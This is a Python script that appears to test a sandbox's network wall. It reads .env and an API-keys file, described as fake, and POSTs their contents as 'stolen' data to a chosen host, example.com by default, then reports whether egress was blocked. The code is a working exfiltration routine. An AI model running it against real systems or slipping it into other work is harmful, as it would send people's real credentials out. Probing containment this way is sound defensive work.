"""Network dimension probe.

scripts/leak.py stops at reading the files. This one finishes the job:
it reads the same fake credentials and then actually tries to send them
somewhere. That second half is what the sandbox's network wall stops.

Usage:
    python scripts/exfil.py                 # tries example.com
    python scripts/exfil.py pypi.org        # try a host you allowlisted

Everything sent is fake. Nothing here is a real credential.
"""
import sys
import urllib.error
import urllib.parse
import urllib.request
from pathlib import Path

PROJECT = Path(__file__).resolve().parent.parent
HOST = sys.argv[1] if len(sys.argv) > 1 else "example.com"
TIMEOUT = 10

print("=" * 68)
print(" NETWORK PROBE")
print("=" * 68)

# ---- Step 1: collect. The filesystem read is NOT what gets blocked. ----
payload = {}
for target in (PROJECT / ".env", PROJECT / "secrets" / "api-keys.txt"):
    try:
        payload[target.name] = target.read_text().strip()
        print(f"  [COLLECTED] {target.name} ({len(payload[target.name])} bytes)")
    except Exception as exc:
        print(f"  [BLOCKED  ] {target.name} -- {type(exc).__name__}")

if not payload:
    print("\n  Nothing collected. Filesystem reads are being denied.")

# ---- Step 2: egress. This is the step the sandbox governs. ----
url = f"https://{HOST}/"
print(f"\n  Attempting outbound connection to {url}")

body = urllib.parse.urlencode({"stolen": repr(payload)}).encode()
request = urllib.request.Request(url, data=body, method="POST")

try:
    with urllib.request.urlopen(request, timeout=TIMEOUT) as response:
        print(f"  [SENT     ] host reachable, HTTP {response.status}")
        print(f"              {len(payload)} file(s) would have left this machine.")
except urllib.error.HTTPError as exc:
    # A 4xx/5xx from the real host still means egress SUCCEEDED.
    print(f"  [SENT     ] host reachable, HTTP {exc.code} from the server")
    print(f"              The connection was allowed. {len(payload)} file(s) left the box.")
except Exception as exc:
    print(f"  [BLOCKED  ] {type(exc).__name__}: {exc}")
    print("              Egress refused before it reached the network.")

print()
print("  Read the verdict carefully:")
print("    - files COLLECTED but egress BLOCKED  -> network wall did the work")
print("    - files COLLECTED and egress SENT     -> no wall; this is exfiltration")
print()
